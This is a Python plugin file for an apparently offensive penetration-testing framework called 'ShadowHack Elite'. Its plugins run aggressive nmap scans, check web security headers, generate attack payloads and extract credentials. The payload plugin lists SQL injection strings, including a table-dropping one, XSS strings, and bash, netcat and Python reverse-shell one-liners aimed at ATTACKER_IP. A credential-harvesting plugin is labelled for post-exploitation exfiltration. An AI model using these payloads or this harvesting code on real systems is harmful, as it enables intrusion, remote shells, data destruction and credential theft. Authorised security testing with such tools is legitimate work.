#!/usr/bin/env python3
"""
Example Plugin: Network Reconnaissance Scanner
Integrated with ShadowHack Elite CLI Framework
"""

from cli_pentester_framework import Plugin, Finding, SeverityLevel
import subprocess
import json
from typing import Dict, List, Any


class NetworkReconPlugin(Plugin):
    """
    Network reconnaissance plugin for comprehensive network scanning and analysis
    """
    
    def __init__(self):
        super().__init__("NetworkRecon", version="1.0.0")
        self.metadata = {
            "author": "ShadowHack Team",
            "description": "Comprehensive network reconnaissance and discovery",
            "category": "reconnaissance",
            "tags": ["nmap", "network", "scanning", "discovery"]
        }
        self.scan_results = {}
    
    def initialize(self):
        """Initialize the plugin"""
        self.enabled = True
        print(f"[*] Initializing {self.name} plugin...")
    
    def validate(self) -> bool:
        """Validate plugin dependencies"""
        try:
            # Check if nmap is available
            result = subprocess.run(
                ["nmap", "--version"],
                capture_output=True,
                timeout=5
            )
            return result.returncode == 0
        except Exception:
            return False
    
    def get_capabilities(self) -> List[str]:
        """Return plugin capabilities"""
        return [
            "host_discovery",
            "port_scanning",
            "service_enumeration",
            "os_detection",
            "vulnerability_detection"
        ]
    
    def execute(self, **kwargs) -> Dict[str, Any]:
        """Execute network reconnaissance"""
        target = kwargs.get("target")
        scan_type = kwargs.get("scan_type", "basic")
        
        if not target:
            raise ValueError("Target is required")
        
        if scan_type == "basic":
            return self._basic_scan(target)
        elif scan_type == "aggressive":
            return self._aggressive_scan(target)
        elif scan_type == "full":
            return self._full_scan(target)
        else:
            raise ValueError(f"Unknown scan type: {scan_type}")
    
    def _basic_scan(self, target: str) -> Dict[str, Any]:
        """Perform basic network scan"""
        cmd = [
            "nmap",
            "-Pn",  # No ping
            "-p-",  # All ports
            "--open",
            "-sV",  # Version detection
            target
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
        
        findings = self._parse_nmap_output(result.stdout)
        
        return {
            "success": result.returncode == 0,
            "target": target,
            "scan_type": "basic",
            "findings": findings,
            "raw_output": result.stdout
        }
    
    def _aggressive_scan(self, target: str) -> Dict[str, Any]:
        """Perform aggressive network scan"""
        cmd = [
            "nmap",
            "-A",  # Aggressive
            "-T4",  # Fast
            "-p-",  # All ports
            "--script", "vuln",  # Vulnerability scripts
            target
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=1200)
        findings = self._parse_nmap_output(result.stdout)
        
        return {
            "success": result.returncode == 0,
            "target": target,
            "scan_type": "aggressive",
            "findings": findings,
            "raw_output": result.stdout
        }
    
    def _full_scan(self, target: str) -> Dict[str, Any]:
        """Perform full comprehensive scan"""
        cmd = [
            "nmap",
            "-Pn",
            "-A",
            "-T4",
            "-p-",
            "--script", "all",
            "--script-args", "newtargets",
            "-oX", "-",  # XML output
            target
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=1800)
        findings = self._parse_nmap_output(result.stdout)
        
        return {
            "success": result.returncode == 0,
            "target": target,
            "scan_type": "full",
            "findings": findings,
            "raw_output": result.stdout
        }
    
    def _parse_nmap_output(self, output: str) -> List[Dict]:
        """Parse nmap output for findings"""
        findings = []
        
        # Parse open ports
        lines = output.split("\n")
        for line in lines:
            if "/open/" in line:
                parts = line.split()
                if len(parts) >= 3:
                    port_info = parts[0]
                    service = parts[2]
                    
                    finding = {
                        "title": f"Open Service: {service}",
                        "severity": "medium",
                        "location": port_info,
                        "description": f"Service {service} found open",
                        "remediation": "Review service necessity and close if not required"
                    }
                    findings.append(finding)
        
        return findings


class WebVulnScannerPlugin(Plugin):
    """
    Web vulnerability scanner plugin
    """
    
    def __init__(self):
        super().__init__("WebVulnScanner", version="1.0.0")
        self.metadata = {
            "author": "ShadowHack Team",
            "description": "Comprehensive web vulnerability scanning",
            "category": "web",
            "tags": ["web", "vulnerabilities", "scanning"]
        }
    
    def initialize(self):
        """Initialize the plugin"""
        self.enabled = True
        print(f"[*] Initializing {self.name} plugin...")
    
    def validate(self) -> bool:
        """Validate plugin dependencies"""
        try:
            result = subprocess.run(
                ["curl", "--version"],
                capture_output=True,
                timeout=5
            )
            return result.returncode == 0
        except Exception:
            return False
    
    def get_capabilities(self) -> List[str]:
        """Return plugin capabilities"""
        return [
            "web_scanning",
            "sql_injection_detection",
            "xss_detection",
            "csrf_detection",
            "authentication_testing"
        ]
    
    def execute(self, **kwargs) -> Dict[str, Any]:
        """Execute web vulnerability scan"""
        target = kwargs.get("target")
        scan_type = kwargs.get("scan_type", "quick")
        
        if not target:
            raise ValueError("Target URL is required")
        
        if scan_type == "quick":
            return self._quick_scan(target)
        elif scan_type == "thorough":
            return self._thorough_scan(target)
        else:
            raise ValueError(f"Unknown scan type: {scan_type}")
    
    def _quick_scan(self, target: str) -> Dict[str, Any]:
        """Quick web vulnerability scan"""
        findings = []
        
        # Check for common vulnerabilities
        checks = [
            ("X-Frame-Options", "Clickjacking vulnerability"),
            ("X-Content-Type-Options", "MIME type sniffing vulnerability"),
            ("Strict-Transport-Security", "Missing HSTS header"),
            ("Content-Security-Policy", "Missing CSP header")
        ]
        
        for header, vuln_name in checks:
            if not self._check_header(target, header):
                findings.append({
                    "title": vuln_name,
                    "severity": "medium",
                    "location": target,
                    "description": f"Missing {header} header",
                    "remediation": f"Add {header} HTTP response header"
                })
        
        return {
            "success": True,
            "target": target,
            "scan_type": "quick",
            "findings": findings
        }
    
    def _thorough_scan(self, target: str) -> Dict[str, Any]:
        """Thorough web vulnerability scan"""
        # Implementation would be more comprehensive
        return self._quick_scan(target)
    
    def _check_header(self, target: str, header: str) -> bool:
        """Check if HTTP header exists"""
        try:
            result = subprocess.run(
                ["curl", "-I", target],
                capture_output=True,
                text=True,
                timeout=10
            )
            return header in result.stdout
        except Exception:
            return False


class PayloadGeneratorPlugin(Plugin):
    """
    Payload generation and crafting plugin
    """
    
    def __init__(self):
        super().__init__("PayloadGenerator", version="1.0.0")
        self.metadata = {
            "author": "ShadowHack Team",
            "description": "Generate and craft security testing payloads",
            "category": "exploitation",
            "tags": ["payloads", "exploitation", "crafting"]
        }
    
    def initialize(self):
        """Initialize the plugin"""
        self.enabled = True
        print(f"[*] Initializing {self.name} plugin...")
    
    def validate(self) -> bool:
        """Validate plugin dependencies"""
        return True  # Python is always available
    
    def get_capabilities(self) -> List[str]:
        """Return plugin capabilities"""
        return [
            "sql_injection_payloads",
            "xss_payloads",
            "command_injection_payloads",
            "reverse_shell_payloads",
            "file_upload_payloads"
        ]
    
    def execute(self, **kwargs) -> Dict[str, Any]:
        """Generate payloads"""
        payload_type = kwargs.get("type", "sql_injection")
        target_db = kwargs.get("target_db", "mysql")
        
        if payload_type == "sql_injection":
            payloads = self._generate_sql_payloads(target_db)
        elif payload_type == "xss":
            payloads = self._generate_xss_payloads()
        elif payload_type == "reverse_shell":
            payloads = self._generate_reverse_shell_payloads()
        else:
            raise ValueError(f"Unknown payload type: {payload_type}")
        
        return {
            "success": True,
            "payload_type": payload_type,
            "payloads": payloads,
            "count": len(payloads)
        }
    
    def _generate_sql_payloads(self, target_db: str) -> List[str]:
        """Generate SQL injection payloads"""
        payloads = [
            "' OR '1'='1",
            "' OR 1=1 --",
            "' UNION SELECT NULL --",
            "'; DROP TABLE users; --",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' or 1=1 or ''='",
        ]
        
        if target_db == "mssql":
            payloads.extend([
                "' OR '1'='1' --",
                "' UNION SELECT @@version --",
            ])
        
        return payloads
    
    def _generate_xss_payloads(self) -> List[str]:
        """Generate XSS payloads"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
        ]
    
    def _generate_reverse_shell_payloads(self) -> List[str]:
        """Generate reverse shell payloads"""
        return [
            "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1",
            "nc ATTACKER_IP PORT -e /bin/bash",
            "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        ]


class DataExfiltrationPlugin(Plugin):
    """
    Data analysis and exfiltration plugin
    """
    
    def __init__(self):
        super().__init__("DataExfiltration", version="1.0.0")
        self.metadata = {
            "author": "ShadowHack Team",
            "description": "Analyze and exfiltrate sensitive data",
            "category": "post-exploitation",
            "tags": ["data", "exfiltration", "analysis"]
        }
    
    def initialize(self):
        """Initialize the plugin"""
        self.enabled = True
    
    def validate(self) -> bool:
        """Validate plugin dependencies"""
        return True
    
    def get_capabilities(self) -> List[str]:
        """Return plugin capabilities"""
        return [
            "data_discovery",
            "credential_extraction",
            "file_recovery",
            "memory_analysis"
        ]
    
    def execute(self, **kwargs) -> Dict[str, Any]:
        """Execute data analysis"""
        analysis_type = kwargs.get("type", "credential_detection")
        data = kwargs.get("data", "")
        
        findings = []
        
        if analysis_type == "credential_detection":
            findings = self._detect_credentials(data)
        elif analysis_type == "sensitive_patterns":
            findings = self._find_sensitive_patterns(data)
        
        return {
            "success": True,
            "analysis_type": analysis_type,
            "findings": findings,
            "data_sensitivity": self._calculate_sensitivity(findings)
        }
    
    def _detect_credentials(self, data: str) -> List[Dict]:
        """Detect credentials in data"""
        import re
        findings = []
        
        patterns = {
            "email": r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
            "password": r'(?i)(password|passwd|pass|pwd)\s*[:=]\s*[^\s]+',
            "api_key": r'(?i)(api[_-]?key|apikey)\s*[:=]\s*[^\s]+',
            "private_key": r'-----BEGIN.*PRIVATE.*KEY-----',
        }
        
        for pattern_name, pattern in patterns.items():
            matches = re.finditer(pattern, data)
            for match in matches:
                findings.append({
                    "type": pattern_name,
                    "value": match.group(),
                    "severity": "high"
                })
        
        return findings
    
    def _find_sensitive_patterns(self, data: str) -> List[Dict]:
        """Find sensitive information patterns"""
        import re
        findings = []
        
        sensitive_keywords = [
            "secret", "password", "token", "key", "credential",
            "api_key", "access_token", "private", "confidential"
        ]
        
        for keyword in sensitive_keywords:
            if keyword.lower() in data.lower():
                findings.append({
                    "keyword": keyword,
                    "severity": "medium"
                })
        
        return findings
    
    def _calculate_sensitivity(self, findings: List[Dict]) -> str:
        """Calculate overall data sensitivity"""
        if not findings:
            return "low"
        
        high_count = sum(1 for f in findings if f.get("severity") == "high")
        
        if high_count >= 5:
            return "critical"
        elif high_count >= 3:
            return "high"
        else:
            return "medium"


# Plugin registration
PLUGINS = [
    NetworkReconPlugin(),
    WebVulnScannerPlugin(),
    PayloadGeneratorPlugin(),
    DataExfiltrationPlugin(),
]


if __name__ == "__main__":
    print("ShadowHack Elite Plugins - Loaded successfully!")
    for plugin in PLUGINS:
        print(f"  • {plugin.name} v{plugin.version}")
        print(f"    Capabilities: {', '.join(plugin.get_capabilities())}")
